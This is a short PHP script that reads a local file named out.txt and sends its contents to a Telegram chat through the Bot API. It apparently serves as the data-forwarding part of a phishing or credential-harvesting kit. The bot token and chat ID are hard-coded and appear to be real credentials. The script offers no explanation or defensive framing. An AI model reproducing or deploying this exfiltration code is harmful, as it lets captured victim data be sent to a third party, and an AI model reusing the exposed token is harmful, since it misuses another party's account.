<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1275284759:AAHmxnpWOq-h4TxufRPMPu5KvTFJ5Q4CDvY/sendMessage?chat_id=856902117&text=$msg");
?>